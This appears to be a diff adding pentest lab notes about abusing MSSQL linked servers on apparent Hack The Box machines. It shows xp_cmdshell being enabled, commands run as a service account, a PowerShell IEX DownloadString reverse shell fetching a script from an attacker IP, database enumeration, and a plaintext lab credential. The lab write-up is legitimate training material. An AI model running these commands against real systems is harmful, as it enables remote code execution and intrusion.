@@ -1343,3 +1343,129 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 netexec smb DC01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -k --generate-krb5-file krb5.conf
 ```
 {% endcode %}
+
+***
+
+## MSSQL SHELL EXECUTION AND REVERSE&#x20;
+
+{% code fullWidth="true" %}
+```sh
+SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
+
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
+[*] INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
+output
+--------------------
+darkzero-ext\svc_sql
+
+NULL
+
+------------------------------------------------------------------------------------------------------------------------------------
+SQL (darkzero\john.w  guest@master)> EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
+INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+SQL (darkzero\john.w  guest@master)> EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
+INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+SQL (darkzero\john.w  guest@master)> EXECUTE('RECONFIGURE;') AT [DC02.darkzero.ext]   
+
+```
+{% endcode %}
+
+And make the reverse shell
+
+{% code fullWidth="true" %}
+```sh
+SQL (darkzero\john.w  guest@master)> EXECUTE('EXEC xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.139:8000/script.ps1'')"') AT [DC02.darkzero.ext]
+
+```
+{% endcode %}
+
+***
+
+## <mark style="color:blue;">MSSQL DATABASE ENUMERATION</mark>
+
+```sh
+mssqlclient.py 'scott:Sm230#C5NatH@10.10.11.90' -port 1433
+
+SQL (scott  guest@master)> 
+```
+
+```sh
+SQL (scott  guest@master)> SELECT srvname, isremote FROM sysservers
+srvname   isremote   
+-------   --------   
+DC01             1  
+```
+
+```sh
+SQL (scott  guest@master)> SELECT srvname, isremote FROM sysservers
+srvname   isremote   
+-------   --------   
+DC01             1   
+
+```
+
+```sh
+SQL (scott  guest@master)> select @@servername, @@version, system_user
+                        
+-----   -----   -----   
+scott   scott   scott   
+
+```
+
+```sh
+SQL (scott  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
+    
+-   
+0  
+```
+
+```sh
+SQL (scott  guest@master)> SELECT name FROM sys.databases;
+name     
+------   
+master   
+
+tempdb   
+
+model    
+
+msdb     
+
+SQL (scott  guest@master)> SELECT name, type_desc FROM sys.database_principals;
+name                 type_desc       
+------------------   -------------   
+public               DATABASE_ROLE   
+
+dbo                  SQL_USER        
+
+guest                SQL_USER        
+
+INFORMATION_SCHEMA   SQL_USER        
+
+sys                  SQL_USER        
+
+db_owner             DATABASE_ROLE   
+
+db_accessadmin       DATABASE_ROLE   
+
+db_securityadmin     DATABASE_ROLE   
+
+db_ddladmin          DATABASE_ROLE   
+
+db_backupoperator    DATABASE_ROLE   
+
+db_datareader        DATABASE_ROLE   
+
+db_datawriter        DATABASE_ROLE   
+
+db_denydatareader    DATABASE_ROLE   
+
+db_denydatawriter    DATABASE_ROLE 
+```
+
+We Enumerated mssql client user and we see that we don't have any important role but in exploit we will try to capture the hash and tryng to avance inside the system
